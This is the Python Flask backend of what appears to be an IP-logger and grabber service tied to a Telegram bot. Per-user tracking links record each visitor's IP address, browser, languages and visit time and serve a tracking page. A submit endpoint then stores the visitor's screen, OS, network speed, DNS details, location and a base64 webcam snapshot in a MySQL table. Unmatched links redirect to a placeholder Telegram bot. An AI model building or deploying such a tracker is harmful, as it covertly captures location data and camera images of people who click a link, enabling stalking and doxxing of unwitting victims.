from flask import Flask, request, redirect, jsonify, render_template
import mysql.connector
import os
import base64
from datetime import datetime
import pytz
import re

app = Flask(__name__)

photos_dir = os.path.join(os.getcwd(), 'photos')
if not os.path.exists(photos_dir):
    os.makedirs(photos_dir)

db_config = {
    'user': 'YOUR USERNAME FOR CONNECT TO MYSQL DATABASE',
    'password': 'YOUR MYSQL PASSWORD',
    'host': 'YUOR MYSQL DATABASE URL',
    'database': 'YUOR MYSQL DATABASE NAME',
}

@app.before_request
def redirect_https():
    if not request.is_secure and "/secure" not in request.url:
        url = request.url.replace("http://", "https://", 1)
        return redirect(url)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip_address = request.remote_addr
    return ip_address

def save_camera_image(camera_image_base64):
    if camera_image_base64:
        image_data = base64.b64decode(camera_image_base64.split(',')[1])
        image_name = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        image_path = os.path.join(photos_dir, image_name)

        with open(image_path, 'wb') as image_file:
            image_file.write(image_data)

        return image_path
    return None

def insert_reffer_info(data):
    try:
        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor()

        add_reffer = ("INSERT INTO reffers "
                      "(user_id, link_name, reffer_id, ip_address, whois_link, browser_info, referer, language, "
                      "visit_time, screen_resolution, os_info, internet_speed, dns_info, location_info, camera_image) "
                      "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)")

        print(f"Inserting data: {data}")
        cursor.execute(add_reffer, data)
        connection.commit()

    except mysql.connector.Error as err:
        print(f"Error inserting data: {err}")
    finally:
        cursor.close()
        connection.close()

def parse_user_agent(user_agent):
    browser_match = re.search(r'(Firefox|Chrome|Safari|Opera|MSIE|Trident\/7.0|Edge)\/(\d+)', user_agent)
    browser_name = browser_match.group(1) if browser_match else "Unknown Browser"
    browser_version = browser_match.group(2) if browser_match else "Unknown Version"
    return f"{browser_name} {browser_version}"

def parse_languages(languages):
    lang_map = {
        'en': 'English',
        'ru': 'Russian',
        'uk': 'Ukrainian',
        'es': 'Spanish',
        'zh': 'Chinese',
        'hi': 'Hindi',
        'ar': 'Arabic',
        'pt': 'Portuguese',
        'bn': 'Bengali',
        'fr': 'French',
        'de': 'German',
        'ja': 'Japanese',
        'ko': 'Korean',
        'vi': 'Vietnamese',
        'it': 'Italian',
        'pl': 'Polish',
        'nl': 'Dutch',
        'tr': 'Turkish',
        'fa': 'Persian',
        'ro': 'Romanian',
        'th': 'Thai',
        'cs': 'Czech',
        'hu': 'Hungarian',
        'sv': 'Swedish',
        'da': 'Danish',
        'fi': 'Finnish',
        'he': 'Hebrew',
        'el': 'Greek',
        'bg': 'Bulgarian',
        'no': 'Norwegian',
        'sk': 'Slovak',
        'sr': 'Serbian',
        'hr': 'Croatian',
        'sl': 'Slovenian',
        'lt': 'Lithuanian',
        'lv': 'Latvian',
        'et': 'Estonian',
        'ka': 'Georgian',
        'hy': 'Armenian',
        'az': 'Azerbaijani',
        'ur': 'Urdu',
        'ms': 'Malay',
        'tl': 'Tagalog',
        'my': 'Burmese',
        'km': 'Khmer',
        'lo': 'Lao',
        'si': 'Sinhala',
        'ta': 'Tamil',
        'te': 'Telugu',
        'kn': 'Kannada',
        'ml': 'Malayalam',
        'mr': 'Marathi',
        'gu': 'Gujarati',
        'pa': 'Punjabi',
        'am': 'Amharic',
        'sw': 'Swahili',
        'yo': 'Yoruba',
        'ig': 'Igbo',
        'ha': 'Hausa',
        'zu': 'Zulu',
        'xh': 'Xhosa',
        'af': 'Afrikaans',
        'is': 'Icelandic',
        'mk': 'Macedonian',
        'sq': 'Albanian',
        'bs': 'Bosnian',
        'mt': 'Maltese',
        'cy': 'Welsh',
        'ga': 'Irish',
        'gd': 'Scottish Gaelic',
        'eu': 'Basque',
        'gl': 'Galician',
        'ca': 'Catalan',
        'br': 'Breton',
        'co': 'Corsican',
        'eo': 'Esperanto',
        'fy': 'Frisian',
        'ht': 'Haitian Creole',
        'io': 'Ido',
        'jv': 'Javanese',
        'ky': 'Kyrgyz',
        'la': 'Latin',
        'lb': 'Luxembourgish',
        'mg': 'Malagasy',
        'mi': 'Maori',
        'mn': 'Mongolian',
        'ne': 'Nepali',
        'oc': 'Occitan',
        'ps': 'Pashto',
        'qu': 'Quechua',
        'rn': 'Kirundi',
        'rw': 'Kinyarwanda',
        'sa': 'Sanskrit',
        'sc': 'Sardinian',
        'sn': 'Shona',
        'so': 'Somali',
        'st': 'Sesotho',
        'su': 'Sundanese',
        'tg': 'Tajik',
        'tk': 'Turkmen',
        'ug': 'Uyghur',
        'ur': 'Urdu',
        'uz': 'Uzbek',
        'yi': 'Yiddish',
        'yo': 'Yoruba',
        'ht': 'Haitian',
        'he': 'Hebrew'
    }
    parsed_languages = []
    unique_languages = set()

    for lang in languages.split(','):
        code = lang.split(';')[0].split('-')[0]
        if code not in unique_languages:
            unique_languages.add(code)
            parsed_languages.append(lang_map.get(code, f'🏳 {code}'))

    return ', '.join(parsed_languages)

@app.route('/secure/<link_name>', methods=['GET'])
def secure_track_link(link_name):
    try:
        user_id = None
        referer_id = os.urandom(16).hex()

        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor()

        cursor.execute("SELECT user_id FROM links WHERE link_name=%s", (link_name,))
        result = cursor.fetchone()

        if result:
            user_id = result[0]

        if user_id:
            ip_address = get_client_ip()
            whois_link = f"https://ipinfo.io/{ip_address}"
            user_agent = request.headers.get('User-Agent')
            browser_info = parse_user_agent(user_agent)
            referer = request.headers.get('Referer')
            languages = request.headers.get('Accept-Language')
            language = parse_languages(languages)

            moscow_tz = pytz.timezone('Europe/Moscow')
            visit_time = datetime.now(moscow_tz).strftime('%Y-%m-%d %H:%M:%S')

            return render_template('track.html', user_id=user_id, link_name=link_name, referer_id=referer_id,
                                ip_address=ip_address, whois_link=whois_link, browser_info=browser_info,
                                referer=referer, language=language, visit_time=visit_time)
        else:
            return jsonify(status='failed', message='Link not found'), 404

    except Exception as e:
        print(f"An error occurred: {e}")
        return jsonify(status='error', message='An unexpected error occurred'), 500
    finally:
        cursor.close()
        connection.close()

@app.route('/<link_name>', methods=['GET'])
def track_link(link_name):
    try:
        user_id = None
        referer_id = os.urandom(16).hex()

        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor()

        cursor.execute("SELECT user_id FROM links WHERE link_name=%s", (link_name,))
        result = cursor.fetchone()

        if result:
            user_id = result[0]

        if user_id:
            ip_address = get_client_ip()
            whois_link = f"https://ipinfo.io/{ip_address}"
            user_agent = request.headers.get('User-Agent')
            browser_info = parse_user_agent(user_agent)
            referer = request.headers.get('Referer')
            languages = request.headers.get('Accept-Language')
            language = parse_languages(languages)

            moscow_tz = pytz.timezone('Europe/Moscow')
            visit_time = datetime.now(moscow_tz).strftime('%Y-%m-%d %H:%M:%S')

            return render_template('track.html', user_id=user_id, link_name=link_name, referer_id=referer_id,
                                ip_address=ip_address, whois_link=whois_link, browser_info=browser_info,
                                referer=referer, language=language, visit_time=visit_time)
        else:
            return redirect("https://t.me/yuorbotusernamewithuot@")

    except Exception as e:
        print(f"An error occurred: {e}")
        return redirect("https://t.me/yuorbotusernamewithuot@")
    finally:
        cursor.close()
        connection.close()

@app.route('/submit_data', methods=['POST'])
def submit_data():
    try:
        data = request.json
        print("Received data:", data)

        camera_image_path = save_camera_image(data.get('camera_image'))
        print("Camera image saved at:", camera_image_path)

        insert_reffer_info((
            data['user_id'],
            data['link_name'],
            data['referer_id'],
            data['ip_address'],
            data['whois_link'],
            data['browser_info'],
            data['referer'],
            data['language'],
            data['visit_time'],
            data['screen_resolution'],
            data['os_info'],
            data['internet_speed'],
            data['dns_info'],
            data['location_info'],
            camera_image_path
        ))

        print("Data inserted successfully into the database")
        return jsonify(status='success'), 200

    except Exception as e:
        print(f"An error occurred: {e}")
        return redirect("https://t.me/yuorbotusernamewithuot@")


if __name__ == '__main__':
    app.run(debug=True, port=8080)
